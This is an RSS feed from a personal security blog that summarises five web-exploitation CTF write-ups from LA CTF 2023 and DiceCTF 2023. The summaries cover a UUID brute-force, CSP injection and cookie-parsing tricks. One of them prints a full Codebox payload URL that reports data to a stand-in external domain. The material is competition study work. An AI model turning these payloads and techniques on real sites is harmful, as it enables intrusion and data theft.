<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>writeup - Tag - My Blog</title><link>http://r0h1t.me/blog/tags/writeup/</link><description>writeup - Tag - My Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>rohitnanu.m@gmail.com (Rohit)</managingEditor><webMaster>rohitnanu.m@gmail.com (Rohit)</webMaster><lastBuildDate>Wed, 15 Feb 2023 00:00:00 +0530</lastBuildDate><atom:link href="http://r0h1t.me/blog/tags/writeup/" rel="self" type="application/rss+xml"/><item><title>queue up - LA CTF 2023</title><link>http://r0h1t.me/blog/posts/queue-up/</link><pubDate>Wed, 15 Feb 2023 00:00:00 +0530</pubDate><author><name>Rohit</name></author><guid>http://r0h1t.me/blog/posts/queue-up/</guid><description><![CDATA[<h4 id="tldr" class="headerLink">
    <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
<li>Find the flag server <code>qu-flag.lac.tf</code></li>
<li>send a request to <code>https://qu-flag.lac.tf</code> with the <code>uuid</code> as an array and its first element as <code>{uuid}/bypass#</code></li>
<li>Visit the server with that uuid as a cookie</li>
</ul>]]></description></item><item><title>uuid hell - LA CTF 2023</title><link>http://r0h1t.me/blog/posts/uuid-hell/</link><pubDate>Wed, 15 Feb 2023 00:00:00 +0530</pubDate><author><name>Rohit</name></author><guid>http://r0h1t.me/blog/posts/uuid-hell/</guid><description><![CDATA[<h4 id="tldr" class="headerLink">
    <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
<li>It uses uuidv1 which is time-based</li>
<li>We get the user uid from the cookie</li>
<li>Then create an admin and get all the current admin hashes as an array from the web page</li>
<li>Create another user</li>
<li>Brutefoce the first eight bytes of the uuid in the range and check with each hash in the array</li>
<li>Use the one that matches</li>
</ul>]]></description></item><item><title>Codebox - DiceCTF 2023</title><link>http://r0h1t.me/blog/posts/codebox/</link><pubDate>Wed, 08 Feb 2023 00:00:00 +0530</pubDate><author><name>Rohit</name></author><guid>http://r0h1t.me/blog/posts/codebox/</guid><description><![CDATA[<h4 id="tldr" class="headerLink">
    <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
<li>Use img src to inject csp</li>
<li>Use <code>report-uri your-domain</code> to get csp violation reports</li>
<li>Use <code>require-trusted-types-for 'script'</code> to get violation when <code>innerHTML</code> is set</li>
<li>Use <code>code=&amp;code&lt;payload&gt;</code> to make code undefined in front end</li>
</ul>
<p>Final Payload: <code>https://codebox.mc.ax/?code=&amp;code=&lt;img+src=&quot;*;+require-trusted-types-for+'script'+;+report-uri+https://your.domain.com/&quot;+&gt;</code></p>]]></description></item><item><title>Jnotes - DiceCTF 2023</title><link>http://r0h1t.me/blog/posts/jnotes/</link><pubDate>Wed, 08 Feb 2023 00:00:00 +0530</pubDate><author><name>Rohit</name></author><guid>http://r0h1t.me/blog/posts/jnotes/</guid><description><![CDATA[<h4 id="tldr" class="headerLink">
    <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
<li>Java mishandles the cookies such that when there is a cookie with a <code>&quot;</code>, it will take all the cookies until there is a <code>&quot;</code> as that cookie&rsquo;s value</li>
<li>We can set empty cookies using javascript <code>document.cookie=&quot;=value&quot;</code>;</li>
<li>Use that to set a new note cookie by adding <code>note</code> in the value <code>document.cookie='=note=&quot;';</code></li>
<li>Make our cookie first by giving path as <code>//</code> as chrome sends cookies with longer paths first</li>
<li>Now create an iframe with <code>//</code> as src and read its innerHTML</li>
</ul>]]></description></item><item><title>Recursive-csp - DiceCTF 2023</title><link>http://r0h1t.me/blog/posts/rescursive-csp/</link><pubDate>Wed, 08 Feb 2023 00:00:00 +0530</pubDate><author><name>Rohit</name></author><guid>http://r0h1t.me/blog/posts/rescursive-csp/</guid><description><![CDATA[<h4 id="tldr" class="headerLink">
    <a href="#tldr" class="header-mark"></a>tl;dr</h4><ul>
<li>Craft a payload with a random nonce</li>
<li>Use something like hash-collider to collide the nonce we gave earlier</li>
</ul>]]></description></item></channel></rss>